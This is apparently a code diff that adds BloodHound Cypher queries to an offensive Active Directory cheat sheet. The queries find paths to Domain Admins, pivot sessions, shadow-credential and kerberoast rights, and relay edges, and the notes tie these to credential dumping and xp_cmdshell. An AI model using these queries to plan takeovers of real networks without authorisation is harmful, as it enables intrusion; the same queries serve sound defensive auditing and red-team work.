+{t:'Owned → any Domain Admins group (all domains)',q:'MATCH (g:Group) WHERE g.objectid ENDS WITH "-512" MATCH p=shortestPath((o {owned:true})-[*1..]->(g)) RETURN p',n:'RID -512 = Domain Admins in every domain — catches the second/partner domain too.'},
+{t:'What a group controls (replace GROUP/REALM)',q:'MATCH (u:User)-[:MemberOf*1..]->(g:Group {name:"<GROUP>@<REALM>"}) MATCH p=(u)-[:GenericAll|GenericWrite|WriteDacl|WriteOwner|Owns|AllExtendedRights|AddMember|AddSelf|ForceChangePassword|AddKeyCredentialLink|WriteSPN|AllowedToAct|AllowedToDelegate]->(t) RETURN p',n:'The "what can IT do" query: dangerous outbound rights of every (nested) member. Replace <span class="mono">&lt;GROUP&gt;@&lt;REALM&gt;</span>, e.g. <span class="mono">IT@{{trust_realm}}</span>.'},
+{t:'Effective members of a group',q:'MATCH (u)-[:MemberOf*1..]->(g:Group {name:"<GROUP>@<REALM>"}) RETURN DISTINCT u.name, labels(u)',n:'Flatten direct + nested memberships without the GUI (same as <span class="mono">bhcli members --indirect</span>).'},
+{t:'Sessions of group members',q:'MATCH (c:Computer)-[:HasSession]->(u:User)-[:MemberOf*1..]->(g:Group {name:"<GROUP>@<REALM>"}) RETURN DISTINCT c.name, u.name',n:'Where the group (e.g. IT) actually works — the fastest pivots.'},
+{t:'Local admin / remote access of group members',q:'MATCH (u:User)-[:MemberOf*1..]->(g:Group {name:"<GROUP>@<REALM>"}) MATCH p=(u)-[:AdminTo|CanRDP|CanPSRemote|ExecuteDCOM|SQLAdmin]->(c:Computer) RETURN p',n:'AdminTo → dump SAM/LSA, CanPSRemote → WinRM, SQLAdmin → xp_cmdshell.'},
+{t:'Shadow-credential / targeted-kerberoast rights from owned',q:'MATCH p=(o {owned:true})-[:AddKeyCredentialLink|WriteSPN]->(t) RETURN p',n:'Two quiet takeover paths: KeyCredentialLink (shadow creds) and WriteSPN (targeted kerberoast).'},
+{t:'Coerce-and-relay edges',q:'MATCH p=(c:Computer)-[:CoerceAndRelayNTLMToSMB|CoerceAndRelayNTLMToLDAP|CoerceAndRelayNTLMToLDAPS|CoerceAndRelayNTLMToADCS]->(t) RETURN p',n:'BloodHound precomputes where a coerced machine account can be relayed — pairs with the coercion/relay cards.'},
+{t:'Cross-domain sessions',q:'MATCH (c:Computer)-[:HasSession]->(u:User) WHERE u.domain <> c.domain RETURN c.name, u.name, u.domain',n:'Users authenticating into the other domain — a pivot in both directions.'},
+{t:'Foreign members in all groups (both directions)',q:'MATCH p=(u:User)-[:MemberOf*1..]->(g:Group) WHERE u.domain <> g.domain RETURN p',n:'Domain-aware version of the foreign-members query: your groups in the partner domain and vice versa.'},
+{t:'Tier Zero inventory',q:'MATCH (t) WHERE "admin_tier_0" IN coalesce(t.system_tags, []) OR coalesce(t.highvalue, false) RETURN t.name, labels(t)',n:'What BloodHound considers crown jewels (CE tag <span class="mono">admin_tier_0</span>, legacy <span class="mono">highvalue</span>) — pick targets before pathfinding.'},
 {t:'Shortest path between two objects (helper)',q:'MATCH p=shortestPath((a {name:"<FROM>"})-[*1..]->(b {name:"<TO>"})) RETURN p',n:'Replace <FROM> and <TO> with node names, e.g. "USER@CORP.LOCAL" or "DC01.CORP.LOCAL".'}
 );
 
